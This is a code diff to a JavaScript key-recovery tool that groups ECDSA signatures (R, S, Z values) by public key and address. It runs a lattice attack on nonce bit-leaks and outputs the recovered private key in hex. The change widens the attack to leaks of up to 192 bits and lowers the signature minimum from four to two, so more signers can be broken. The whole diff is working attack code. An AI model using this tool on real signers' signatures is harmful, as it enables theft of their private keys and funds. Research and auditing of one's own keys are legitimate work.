@@ -709,11 +709,35 @@
             return null;
         }
 
-        // Ladder of leak sizes to test, largest L (fewest bits, cheapest) first.
-        // Only as many signatures as a given L needs are used, so the common
-        // small-signer case stays fast; big signers cap at MAXSIGS (dim 22).
-        var LADDER = [64, 48, 32, 24, 20, 16];
+        // Ladder of leak sizes L (leaked/known nonce bits) to test, largest L
+        // first — a bigger leak means fewer unknown bits (B = 2^(256-L)), so it
+        // is the cheapest AND needs the fewest signatures (need ~= 256/L). Going
+        // up to 192 is what makes big leaks recoverable: a leak that leaves only
+        // ~64 unknown bits recovers from 2 signatures, ~160 unknown from 3, so
+        // 125- and 164-bit leaks (which the old 64-max ladder never reached, and
+        // whose 2-3 sig signers the old avail<4 gate discarded) now succeed. The
+        // graded rungs also give LLL a tight bound per size for reliability.
+        // Only as many signatures as a rung needs are used; big signers cap at
+        // MAXSIGS. The headline leak size is recomputed from the real recovered
+        // nonces (trueLeakBits), not from whichever rung verified first.
+        var LADDER = [192, 128, 96, 64, 48, 32, 24, 20, 16];
         var GUARD = 4, MAXSIGS = 20;
+        // Honest leak size for a recovered key: the smallest count of zero nonce
+        // bits (top for MSB, low for LSB) across the signatures actually used.
+        // Every used nonce had at least this many leaked bits, so it is the true
+        // exploitable leak — independent of which ladder rung happened to verify.
+        function trueLeakBits(used, d, model) {
+            var mn = 256;
+            for (var i = 0; i < used.length; i++) {
+                var k = mod(modInv(used[i].s, N) * (used[i].z + used[i].r * d), N);
+                var zb;
+                if (model === "msb") { zb = 256 - (k === 0n ? 0 : k.toString(2).length); }
+                else if (k === 0n) { zb = 256; }
+                else { zb = 0; var x = k; while ((x & 1n) === 0n) { zb++; x >>= 1n; } }
+                if (zb < mn) mn = zb;
+            }
+            return mn;
+        }
         function analyzeGroup(g, report) {
             var raw = g.sigs.map(function (s) { return { r: BigInt("0x" + s.r), s: BigInt("0x" + s.s), z: BigInt("0x" + s.z) }; });
             var seen = {}, sigs = [];
@@ -724,7 +748,11 @@
             var cpub = compressPub(g.pub);
             var avail = sigs.length;
             var out = { addr: g.addr, pub: g.pub, count: avail, found: false };
-            if (!cpub || avail < 4) return out;
+            // A large leak needs only 2 signatures (need = ceil(256/L)); the
+            // per-rung `need` check below skips any rung this signer can't
+            // afford, so 2 is the true floor. Every hit is verified d*G == pub,
+            // so a low floor never yields a false positive.
+            if (!cpub || avail < 2) return out;
             var models = ["msb", "lsb"];
             for (var mi = 0; mi < models.length; mi++) {
                 for (var li = 0; li < LADDER.length; li++) {
@@ -733,11 +761,12 @@
                     if (avail < need) continue;
                     var m = Math.min(avail, need + GUARD, MAXSIGS);
                     if (m < need) continue;
+                    var used = sigs.slice(0, m);
                     report({ type: "progress", phase: "attempt", model: models[mi], L: L, m: m });
-                    var d = solveHNP(sigs.slice(0, m), models[mi], L, cpub);
+                    var d = solveHNP(used, models[mi], L, cpub);
                     if (d) {
                         var pk = d.toString(16); while (pk.length < 64) pk = "0" + pk;
-                        out.found = true; out.L = L; out.model = models[mi]; out.priv = pk; out.usedSigs = m;
+                        out.found = true; out.L = trueLeakBits(used, d, models[mi]); out.model = models[mi]; out.priv = pk; out.usedSigs = m;
                         return out;
                     }
                 }
@@ -897,7 +926,7 @@
         }
 
         const groups = groupByPub(rsz);
-        const multi = groups.filter(function (g) { return g.sigs.length >= 4; }).length;
+        const multi = groups.filter(function (g) { return g.sigs.length >= 2; }).length;
 
         let html = '';
 
@@ -907,7 +936,7 @@
             html += '<div class="rsz-status">' + spinner(14) + ' Analyzing nonce bit-leak (MSB + LSB) across ' +
                 multi + ' signer' + (multi > 1 ? 's' : '') + '…</div>';
         } else {
-            html += '<div class="rsz-leak-note">Bit-leak recovery needs several signatures (at least 4) from one key. ' +
+            html += '<div class="rsz-leak-note">Bit-leak recovery needs several signatures (at least 2) from one key. ' +
                 'Not enough here — the R &middot; S &middot; Z values are listed below.</div>';
         }
         html += '</div>';
@@ -959,7 +988,7 @@
         }
         // Nobody had enough signatures to test.
         if (!results.length) {
-            return '<div class="rsz-leak-note">No signer here has enough signatures (at least 4 from one key) ' +
+            return '<div class="rsz-leak-note">No signer here has enough signatures (at least 2 from one key) ' +
                 'to test for a nonce bit-leak. The R &middot; S &middot; Z values are listed below.</div>';
         }
 
